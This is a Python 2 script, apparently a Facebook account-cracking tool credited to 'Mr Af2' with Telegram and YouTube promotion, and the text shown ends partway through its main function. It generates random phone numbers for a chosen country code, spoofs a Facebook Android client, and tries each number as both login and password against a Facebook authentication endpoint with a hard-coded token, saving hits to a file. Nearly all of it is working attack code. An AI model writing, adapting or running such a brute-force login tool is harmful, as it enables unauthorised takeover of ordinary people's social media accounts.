# Compile By Mr Af2
# YouTube kargah wahid
# https://github.com/panjsher
# telegram    t.me/hackpjr

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1000):
    number = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print number
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 number.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = '\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x93\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 creator Mr Af2\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  telegram   t.me/hackpjr\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88youtube   kargah wahid\n\x1b[1;92m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  facebook   Mr Af2\n                                '
back = 0
successful = []
checkpoint = []
successfull = []
id = []

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x98\x85\xef\xbe\x9f.\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x80\xa6\xe3\x83\xbb\xe2\x80\xa5\xe2\x98\x86*\xc2\xb4\xef\xbd\xa5\xef\xbc\x88Mr Af2\xef\xbc\x89\xef\xbd\xa5\xef\xbd\x80*\xe2\x98\x86\xe3\x83\xbb\xe2\x80\xa5\xe2\x80\xa6\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xef\xbe\x9f.\xe2\x98\x85\n'
    print '\x1b[1;97m[1]\x1b[1;92m  Bangladesh'
    print '\x1b[1;97m[2]\x1b[1;92m  Afg'
    print '\x1b[1;97m[3]\x1b[1;92m  UK'
    print '\x1b[1;97m[4]\x1b[1;92m India'
    print '\x1b[1;97m[5]\x1b[1;92m  Brazil'
    print '\x1b[1;97m[6]\x1b[1;92m  Japan'
    print '\x1b[1;97m[7]\x1b[1;92m  Korea'
    print '\x1b[1;97m[8]\x1b[1;92m  Italy'
    print '\x1b[1;97m[9]\x1b[1;92m  Spain'
    print '\x1b[1;97m[10]\x1b[1;92m Poland'
    print '\x1b[1;97m[11]\x1b[1;92m Pakistan'
    print '\x1b[1;97m[12]\x1b[1;92m Indonisia'
    print '\x1b[1;97m[13]\x1b[1;92m Youtube Channel'
    print '\x1b[1;97m[0]\x1b[1;92m  Exit            '
    print '\x1b[1;96m\xe2\x98\x85\xef\xbe\x9f.\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x80\xa6\xe3\x83\xbb\xe2\x80\xa5\xe2\x98\x86*\xc2\xb4\xef\xbd\xa5\xef\xbc\x88Mr Af2\xef\xbc\x89\xef\xbd\xa5\xef\xbd\x80*\xe2\x98\x86\xe3\x83\xbb\xe2\x80\xa5\xe2\x80\xa6\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xef\xbe\x9f.\xe2\x98\x85\n'
    action()


def action():
    global checkpoint
    global successfull
    ahmad = raw_input('\n\x1b[1;91m>>>  ')
    if ahmad == '':
        print '[!] Fill in correctly'
        action()
    elif ahmad == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        try:
            c = raw_input('\x1b[1;96m choose code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '2':
        os.system('clear')
        print logo
        print '799, 786, 700, 777'
        try:
            c = raw_input(' choose code  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '3':
        os.system('clear')
        print logo
        print '737, 706, 748, 783, 739, 759, 790'
        try:
            c = raw_input(' choose code  : ')
            k = '+44'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '4':
        os.system('clear')
        print logo
        print '954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
        try:
            c = raw_input(' choose code  : ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '5':
        os.system('clear')
        print logo
        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
        try:
            c = raw_input(' choose code  : ')
            k = '+55'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '6':
        os.system('clear')
        print logo
        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
        try:
            c = raw_input(' choose code  : ')
            k = '+81'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '7':
        os.system('clear')
        print logo
        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
        try:
            c = raw_input(' choose code  : ')
            k = '+82'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '8':
        os.system('clear')
        print logo
        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
        try:
            c = raw_input(' choose code  : ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '9':
        os.system('clear')
        print logo
        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        try:
            c = raw_input(' choose code  : ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '10':
        os.system('clear')
        print logo
        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
        try:
            c = raw_input(' choose code  : ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '11':
        os.system('clear')
        print logo
        print '\x1b[1;93m01, ~to~~, 49'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '12':
        os.system('clear')
        print logo
        print '\x1b[1;93m81,83,85,84,89,'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ahmad == '13':
        os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
        login()
    elif ahmad == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL+z')
    time.sleep(0.5)
    print '\x1b[1;96m\xe2\x98\x85\xef\xbe\x9f.\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x80\xa6\xe3\x83\xbb\xe2\x80\xa5\xe2\x98\x86*\xc2\xb4\xef\xbd\xa5\xef\xbc\x88Mr Af2\xef\xbc\x89\xef\xbd\xa5\xef\xbd\x80*\xe2\x98\x86\xe3\x83\xbb\xe2\x80\xa5\xe2\x80\xa6\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xef\xbe\x9f.\xe2\x98\x85\n'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[Successful]\x1b[1;97m ' + k + c + user + ' \xe2\x9a\xa1\xe2\x9a\xa1 ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '\xe2\x9a\xa1\xe2\x9a\xa1' + pass1 + '\n')
                okb.close()
                successfull.append(c + user + pass1)
